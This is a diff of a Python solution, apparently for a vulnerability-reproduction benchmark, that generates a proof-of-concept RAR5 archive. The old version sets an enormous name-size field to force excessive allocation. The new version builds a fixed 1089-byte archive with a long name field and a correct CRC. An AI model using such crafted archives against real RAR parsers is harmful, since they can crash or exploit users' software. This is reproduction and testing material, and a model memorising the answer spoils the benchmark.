@@ -1,102 +1,77 @@
 import struct
-import os
+import zlib
+
+def write_varint(n):
+    b = bytearray()
+    while True:
+        byte = n & 0x7F
+        n >>= 7
+        if n == 0:
+            b.append(byte)
+            break
+        else:
+            b.append(byte | 0x80)
+    return bytes(b)
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        # RAR5 signature
-        poc = b"Rar!\x1a\x07\x00"
-        
-        # File header (type 0x05)
-        # We'll craft a header with an extremely large name size
-        
-        # First create the header content without CRC
-        header_content = bytearray()
-        
-        # Header type = file header (0x05)
-        header_content.append(0x05)
-        
-        # Flags - minimal flags
-        header_content.extend(b"\x00\x00")
-        
-        # Skip extra area size (0 for no extra area)
-        header_content.append(0x00)
-        
-        # File attributes (0)
-        header_content.append(0x00)
-        
-        # Modification time (0)
-        header_content.append(0x00)
-        
-        # CRC32 of file data (0)
-        header_content.append(0x00)
-        
-        # Compressed size (0)
-        header_content.append(0x00)
-        
-        # Uncompressed size (0)
-        header_content.append(0x00)
-        
-        # Host OS (Windows = 0)
-        header_content.append(0x00)
-        
-        # Name size - this is the critical part
-        # We use a 64-bit variable length integer to represent a huge value
-        # that will cause excessive allocation
-        name_size = 0xFFFFFFFFFFFFFFFF  # Maximum 64-bit value
-        
-        # Encode as variable-length integer
+        # Ignore src_path, generate fixed PoC based on analysis.
+        # Target total PoC length: 1089 bytes.
+        signature = b'Rar!\x1a\x07\x01\x00'  # 8 bytes
+        target_total = 1089
+        header_total = target_total - len(signature)  # should be 1081
+
+        # We'll determine the name length that yields header_total.
+        # Base header fields (type, flags, mtime, attr) each 1 byte.
+        base_fields_len = 4
+        # Iterate to find correct name_len
+        name_len = header_total - 8  # initial guess (without Lhs, Lns)
         while True:
-            byte = name_size & 0x7F
-            name_size >>= 7
-            if name_size == 0:
-                header_content.append(byte)
+            # Compute varint lengths for name_size and header_total
+            name_size_varint = write_varint(name_len)
+            Lns = len(name_size_varint)
+            # Estimate Lhs using current guess for header_total
+            header_size_varint = write_varint(header_total)
+            Lhs = len(header_size_varint)
+            computed_header_total = 4 + Lhs + base_fields_len + Lns + name_len
+            if computed_header_total == header_total:
+                # Verify that the header_size_varint we computed matches the actual header_total
+                if write_varint(computed_header_total) == header_size_varint:
+                    break
+                # If not, adjust name_len and recompute
+            # Adjust name_len to close the gap
+            diff = header_total - computed_header_total
+            if diff == 0:
                 break
-            header_content.append(byte | 0x80)
-            # Limit to avoid infinite loop - we'll use maximum 8 bytes
-            if len(header_content) - header_content.index(0x00) - 10 >= 8:
-                header_content[-1] &= 0x7F  # Clear continuation bit
-                break
-        
-        # Name (minimal, just to have something)
-        header_content.extend(b"x")
-        
-        # Calculate CRC32 of header content
-        crc = 0
-        for byte in header_content:
-            crc ^= byte
-            for _ in range(8):
-                if crc & 1:
-                    crc = (crc >> 1) ^ 0xEDB88320
-                else:
-                    crc >>= 1
-        crc ^= 0xFFFFFFFF
-        
-        # Build final header
-        header = bytearray()
-        header.extend(struct.pack("<I", crc))  # Header CRC
-        header.extend(struct.pack("<H", len(header_content)))  # Header size
-        header.extend(header_content)
-        
-        poc.extend(header)
-        
-        # Add end of archive header (type 0x07)
-        end_header = bytearray()
-        end_header.append(0x07)  # Header type = end of archive
-        end_header.extend(b"\x00\x00")  # Flags
-        
-        # Calculate CRC for end header
-        end_crc = 0
-        for byte in end_header:
-            end_crc ^= byte
-            for _ in range(8):
-                if end_crc & 1:
-                    end_crc = (end_crc >> 1) ^ 0xEDB88320
-                else:
-                    end_crc >>= 1
-        end_crc ^= 0xFFFFFFFF
-        
-        poc.extend(struct.pack("<I", end_crc))
-        poc.extend(struct.pack("<H", len(end_header)))
-        poc.extend(end_header)
-        
-        return bytes(poc)
+            name_len += diff
+            if name_len < 0:
+                raise RuntimeError("Cannot find valid name length")
+        # Now we have stable lengths
+        # Build header content (after CRC)
+        header_content = bytearray()
+        header_content.extend(write_varint(2))      # type: file header
+        header_content.extend(write_varint(0))      # flags: no extra, no data
+        header_content.extend(write_varint(0))      # modification time
+        header_content.extend(write_varint(0))      # file attributes
+        header_content.extend(write_varint(name_len))  # name size
+        header_content.extend(b'A' * name_len)      # name data
+
+        # Prepend header size varint
+        header_size_varint = write_varint(header_total)
+        full_header_without_crc = bytearray()
+        full_header_without_crc.extend(header_size_varint)
+        full_header_without_crc.extend(header_content)
+
+        # Compute CRC32 of full_header_without_crc
+        crc = zlib.crc32(full_header_without_crc) & 0xFFFFFFFF
+        crc_bytes = struct.pack('<I', crc)
+
+        # Final header: CRC + full_header_without_crc
+        final_header = crc_bytes + full_header_without_crc
+
+        # Entire archive
+        archive = signature + final_header
+
+        # Double-check length
+        assert len(archive) == target_total, f"Expected {target_total}, got {len(archive)}"
+        return bytes(archive)
